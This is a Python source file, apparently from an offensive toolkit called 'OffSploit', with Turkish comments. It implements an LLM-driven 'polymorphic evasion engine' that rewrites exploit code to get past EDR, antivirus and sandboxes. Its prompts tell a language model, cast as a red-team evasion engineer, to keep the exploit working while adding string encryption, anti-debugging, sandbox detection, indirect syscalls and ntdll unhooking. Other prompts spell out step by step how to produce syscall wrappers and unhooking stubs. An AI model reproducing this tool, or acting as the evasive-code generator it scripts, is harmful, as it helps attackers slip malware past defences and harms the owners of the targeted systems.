#!/usr/bin/env python3
"""
OffSploit - Polimorfik Evasion Motoru v1.0
============================================
LLM destekli polimorfik kod dönüşümü, indirect syscall üretimi,
API unhooking ve değişken/fonksiyon mutasyonu sağlayan gelişmiş
evasion motoru.
"""

import logging
import random
import string
from dataclasses import dataclass, field
from enum import Enum

from offsploit.response_parser import extract_code_from_response

logger = logging.getLogger("offsploit.evasion")


class EvasionLevel(Enum):
    """Evasion seviyesi."""
    BASIC = "basic"         # Sadece değişken renaming + string encryption
    ADVANCED = "advanced"   # + Indirect syscall + junk code + anti-debug
    PARANOID = "paranoid"   # + API unhooking + process hollowing + full polymorphism


class PolymorphicTransform(Enum):
    """Polimorfik dönüşüm teknikleri."""
    RENAME_VARS = "rename_variables"
    RESTRUCTURE_FUNCS = "restructure_functions"
    REALLOC_MEMORY = "reallocate_memory_patterns"
    INDIRECT_SYSCALL = "indirect_syscall"
    API_UNHOOKING = "api_unhooking"
    STRING_ENCRYPTION = "string_encryption"
    JUNK_CODE = "junk_code_insertion"
    ANTI_DEBUG = "anti_debugging"
    SANDBOX_EVASION = "sandbox_evasion"
    CONTROL_FLOW_FLATTEN = "control_flow_flattening"


# Seviye → Teknik eşlemesi
LEVEL_TECHNIQUES: dict[EvasionLevel, list[PolymorphicTransform]] = {
    EvasionLevel.BASIC: [
        PolymorphicTransform.RENAME_VARS,
        PolymorphicTransform.STRING_ENCRYPTION,
    ],
    EvasionLevel.ADVANCED: [
        PolymorphicTransform.RENAME_VARS,
        PolymorphicTransform.STRING_ENCRYPTION,
        PolymorphicTransform.JUNK_CODE,
        PolymorphicTransform.ANTI_DEBUG,
        PolymorphicTransform.INDIRECT_SYSCALL,
        PolymorphicTransform.SANDBOX_EVASION,
    ],
    EvasionLevel.PARANOID: [
        PolymorphicTransform.RENAME_VARS,
        PolymorphicTransform.RESTRUCTURE_FUNCS,
        PolymorphicTransform.REALLOC_MEMORY,
        PolymorphicTransform.STRING_ENCRYPTION,
        PolymorphicTransform.JUNK_CODE,
        PolymorphicTransform.ANTI_DEBUG,
        PolymorphicTransform.INDIRECT_SYSCALL,
        PolymorphicTransform.API_UNHOOKING,
        PolymorphicTransform.SANDBOX_EVASION,
        PolymorphicTransform.CONTROL_FLOW_FLATTEN,
    ],
}


@dataclass
class EvasionResult:
    """Evasion motoru çıktısı."""
    success: bool
    transformed_code: str = ""
    techniques_applied: list[str] = field(default_factory=list)
    polymorphic_seed: int = 0
    message: str = ""


class CodeMutator:
    """Polimorfik entropi için rastgele isim havuzu üreten yardımcı sınıf.

    Her çalıştırmada farklı değişken/fonksiyon isimleri üreterek
    statik imza eşleşmelerini kırar.
    """

    # Gerçekçi görünümlü isim havuzları
    PREFIXES = [
        "init", "setup", "process", "handle", "validate", "compute",
        "parse", "render", "update", "check", "get", "set", "load",
        "create", "build", "fetch", "resolve", "dispatch", "notify",
        "prepare", "transform", "convert", "serialize", "allocate",
        "register", "configure", "authenticate", "verify", "sync",
    ]

    SUFFIXES = [
        "Data", "Buffer", "Context", "Manager", "Handler", "Worker",
        "Service", "Client", "Config", "Cache", "Pool", "Queue",
        "Stream", "Channel", "Session", "State", "Params", "Result",
        "Token", "Module", "Bridge", "Adapter", "Proxy", "Factory",
    ]

    def __init__(self, seed: int | None = None):
        self.seed = seed or random.randint(100000, 999999)
        self._rng = random.Random(self.seed)
        self._used_names: set[str] = set()

    def generate_name(self, style: str = "camelCase") -> str:
        """Benzersiz, gerçekçi görünümlü bir isim üretir."""
        for _ in range(100):
            prefix = self._rng.choice(self.PREFIXES)
            suffix = self._rng.choice(self.SUFFIXES)
            num = self._rng.randint(0, 99)

            if style == "camelCase":
                name = f"{prefix}{suffix}{num}"
            elif style == "snake_case":
                name = f"{prefix}_{suffix.lower()}_{num}"
            elif style == "single_char":
                name = ''.join(self._rng.choices(string.ascii_lowercase, k=self._rng.randint(4, 8)))
            else:
                name = f"_{prefix}{num}"

            if name not in self._used_names:
                self._used_names.add(name)
                return name

        # Fallback
        return f"_x{self._rng.randint(10000, 99999)}"

    def generate_names(self, count: int, style: str = "camelCase") -> list[str]:
        """Birden fazla benzersiz isim üretir."""
        return [self.generate_name(style) for _ in range(count)]


class EvasionEngine:
    """LLM destekli polimorfik evasion motoru.

    Exploit kodunu EDR/AV'den kaçınacak şekilde dönüştürür:
    - Değişken/fonksiyon renaming
    - String encryption (XOR/Base64)
    - Junk code insertion
    - Anti-debugging
    - Indirect syscall (Windows)
    - API unhooking (Windows)
    - Sandbox evasion
    """

    def __init__(self, llm_client, evasion_level: str = "advanced"):
        self.llm = llm_client
        try:
            self.level = EvasionLevel(evasion_level.lower())
        except ValueError:
            self.level = EvasionLevel.ADVANCED
        self._mutator: CodeMutator | None = None

    def transform(
        self,
        code: str,
        target_os: str = "linux",
        techniques: list[PolymorphicTransform] | None = None,
        seed: int | None = None,
    ) -> EvasionResult:
        """Exploit koduna polimorfik dönüşüm uygular.

        Args:
            code: Dönüştürülecek exploit kodu.
            target_os: Hedef işletim sistemi ('windows' / 'linux').
            techniques: Uygulanacak teknikler (None ise level'a göre seçilir).
            seed: Polimorfik seed (tekrarlanabilirlik için).

        Returns:
            EvasionResult: Dönüştürülmüş kod ve metadata.
        """
        self._mutator = CodeMutator(seed=seed)
        active_techniques = techniques or LEVEL_TECHNIQUES.get(self.level, [])

        logger.info(
            "[EvasionEngine] Dönüşüm başlıyor — seviye=%s, hedef_os=%s, teknik_sayısı=%d, seed=%d",
            self.level.value, target_os, len(active_techniques), self._mutator.seed
        )

        # Teknik listesini string'e çevir
        technique_descriptions = self._build_technique_prompt(active_techniques, target_os)

        # Windows-spesifik eklentiler
        windows_addons = ""
        if target_os.lower() == "windows":
            if PolymorphicTransform.INDIRECT_SYSCALL in active_techniques:
                windows_addons += self._get_indirect_syscall_prompt()
            if PolymorphicTransform.API_UNHOOKING in active_techniques:
                windows_addons += self._get_unhooking_prompt()

        # Polimorfik isim havuzu oluştur
        var_names = self._mutator.generate_names(10, "camelCase")
        func_names = self._mutator.generate_names(5, "snake_case")

        system_prompt = (
            "Sen uzman bir Red Team Evasion mühendisisin. Görevin verilen exploit kodunu "
            "EDR, AV ve sandbox sistemlerinden kaçınacak şekilde dönüştürmektir. "
            "KRİTİK: Kodun orijinal MANTIĞINI ve İŞLEVSELLİĞİNİ KESİNLİKLE BOZMA. "
            "Sadece dönüştürülmüş tam kaynak kodunu dön, hiçbir açıklama ekleme."
        )

        user_prompt = (
            f"İşte dönüştürülecek exploit kodu:\n```\n{code}\n```\n\n"
            f"HEDEF OS: {target_os}\n\n"
            f"UYGULANACAK TEKNİKLER:\n{technique_descriptions}\n\n"
            f"{windows_addons}"
            f"POLİMORFİK İSİM HAVUZU (bu isimleri kullan):\n"
            f"Değişkenler: {', '.join(var_names)}\n"
            f"Fonksiyonlar: {', '.join(func_names)}\n\n"
            f"Lütfen yukarıdaki tüm teknikleri uygulayarak dönüştürülmüş tam kodu dön."
        )

        try:
            resp = self.llm.provider.generate(
                system_prompt, user_prompt,
                temperature=0.2,
                max_tokens=8192,
            )
            transformed = extract_code_from_response(resp)

            if transformed and transformed.strip():
                return EvasionResult(
                    success=True,
                    transformed_code=transformed,
                    techniques_applied=[t.value for t in active_techniques],
                    polymorphic_seed=self._mutator.seed,
                    message=f"Evasion başarılı: {len(active_techniques)} teknik uygulandı.",
                )
            else:
                return EvasionResult(
                    success=False,
                    transformed_code=code,
                    message="LLM boş evasion yanıtı döndürdü.",
                )

        except Exception as exc:
            logger.error("[EvasionEngine] Dönüşüm hatası: %s", exc)
            return EvasionResult(
                success=False,
                transformed_code=code,
                message=f"Evasion hatası: {exc}",
            )

    def _build_technique_prompt(self, techniques: list[PolymorphicTransform], target_os: str) -> str:
        """Teknik listesini LLM prompt formatına dönüştürür."""
        descriptions: dict[PolymorphicTransform, str] = {
            PolymorphicTransform.RENAME_VARS:
                "Tüm değişken, fonksiyon ve sınıf isimlerini tamamen farklı, gerçekçi isimlerle değiştir.",
            PolymorphicTransform.RESTRUCTURE_FUNCS:
                "Fonksiyon yapılarını (inline, split, merge) yeniden düzenle. Kontrol akışını değiştir.",
            PolymorphicTransform.REALLOC_MEMORY:
                "Bellek ayırma desenlerini değiştir (malloc→VirtualAlloc, new→HeapAlloc vb.).",
            PolymorphicTransform.STRING_ENCRYPTION:
                "Tüm sabit string'leri (IP, URL, komut) XOR veya Base64 ile şifrele, kullanıldığında çöz.",
            PolymorphicTransform.JUNK_CODE:
                "Programa etki etmeyen ama dosya hash'ini değiştiren anlamsız kod blokları ekle.",
            PolymorphicTransform.ANTI_DEBUG:
                f"{'IsDebuggerPresent/NtQueryInformationProcess' if target_os == 'windows' else 'ptrace(PTRACE_TRACEME)'} "
                "ile debugger tespiti ekle, tespit edilirse çık.",
            PolymorphicTransform.INDIRECT_SYSCALL:
                "Windows API çağrılarını doğrudan yapmak yerine ntdll.dll'den syscall numarasını çözerek indirect syscall yap.",
            PolymorphicTransform.API_UNHOOKING:
                "ntdll.dll'in disk üzerindeki temiz kopyasını okuyarak bellekteki hook'lanmış .text section'ını üzerine yaz.",
            PolymorphicTransform.SANDBOX_EVASION:
                "CPU çekirdek sayısı (<2), RAM (<2GB), disk boyutu, mouse hareketleri ile sandbox tespiti yap.",
            PolymorphicTransform.CONTROL_FLOW_FLATTEN:
                "Kontrol akışını switch-case tabanlı düzleştirme (flattening) ile karmaşıklaştır.",
        }

        lines = []
        for i, tech in enumerate(techniques, 1):
            desc = descriptions.get(tech, tech.value)
            lines.append(f"{i}. {tech.value}: {desc}")

        return "\n".join(lines)

    def _get_indirect_syscall_prompt(self) -> str:
        """Indirect syscall üretimi için ek prompt."""
        return (
            "\nINDIRECT SYSCALL DETAYLARI:\n"
            "- ntdll.dll'i LoadLibrary ile yükle\n"
            "- Hedef API'nin (NtAllocateVirtualMemory, NtWriteVirtualMemory vb.) SSN'ini (syscall service number) çöz\n"
            "- syscall instruction'ını doğrudan çalıştıran bir wrapper fonksiyon yaz\n"
            "- Inline assembly veya shellcode stub kullan\n"
            "- Örnek pattern:\n"
            "  ```c\n"
            "  // SSN çözme: ntdll export tablosundan Zw* fonksiyonlarını tara\n"
            "  // mov r10, rcx; mov eax, SSN; syscall; ret\n"
            "  ```\n\n"
        )

    def _get_unhooking_prompt(self) -> str:
        """API unhooking üretimi için ek prompt."""
        return (
            "\nAPI UNHOOKING DETAYLARI:\n"
            "- ntdll.dll'in disk üzerindeki orijinal kopyasını oku (CreateFileA + ReadFile)\n"
            "- PE header'ını parse ederek .text section'ını bul\n"
            "- Bellekteki hook'lanmış ntdll .text section'ını disk kopyası ile değiştir\n"
            "- VirtualProtect ile yazma izni al, kopyala, tekrar koru\n\n"
        )

    def generate_indirect_syscall_wrapper(self, api_name: str, target_arch: str = "x64") -> str:
        """Belirli bir Windows API için indirect syscall wrapper fonksiyonu üretir.

        Args:
            api_name: Windows API adı (örn. "NtAllocateVirtualMemory").
            target_arch: Hedef mimari ("x86" / "x64").

        Returns:
            C kodu olarak indirect syscall wrapper.
        """
        system_prompt = (
            "Sen uzman bir Windows internals ve shellcode mühendisisin. "
            "Verilen Windows API için indirect syscall wrapper fonksiyonu yaz. "
            "Sadece C kodu dön, açıklama ekleme."
        )

        user_prompt = (
            f"API: {api_name}\n"
            f"Mimari: {target_arch}\n\n"
            "Lütfen bu API için:\n"
            "1. SSN (Syscall Service Number) çözme fonksiyonu\n"
            "2. Indirect syscall çağırma wrapper'ı\n"
            "3. Inline assembly veya shellcode stub\n"
            "yazarak tam çalışır C kodu üret."
        )

        try:
            resp = self.llm.provider.generate(system_prompt, user_prompt, temperature=0.1)
            return extract_code_from_response(resp)
        except Exception as exc:
            logger.error("[EvasionEngine] Indirect syscall wrapper üretim hatası: %s", exc)
            return f"// Indirect syscall wrapper üretilemedi: {exc}"

    def generate_unhooking_stub(self) -> str:
        """ntdll.dll unhooking stub kodu üretir.

        Returns:
            C kodu olarak unhooking stub.
        """
        system_prompt = (
            "Sen uzman bir EDR bypass mühendisisin. "
            "ntdll.dll'in .text section'ını disk kopyasından restore eden "
            "unhooking kodu yaz. Sadece C kodu dön."
        )

        user_prompt = (
            "ntdll.dll API unhooking kodu yaz:\n"
            "1. CreateFileA ile C:\\Windows\\System32\\ntdll.dll'i aç\n"
            "2. PE header parse ederek .text section offset ve boyutunu bul\n"
            "3. VirtualProtect ile bellekteki ntdll .text section'ına yazma izni ver\n"
            "4. Disk kopyasındaki temiz .text section'ı belleğe kopyala\n"
            "5. VirtualProtect ile korumayı geri al\n"
            "Tam çalışır C kodu üret."
        )

        try:
            resp = self.llm.provider.generate(system_prompt, user_prompt, temperature=0.1)
            return extract_code_from_response(resp)
        except Exception as exc:
            logger.error("[EvasionEngine] Unhooking stub üretim hatası: %s", exc)
            return f"// Unhooking stub üretilemedi: {exc}"
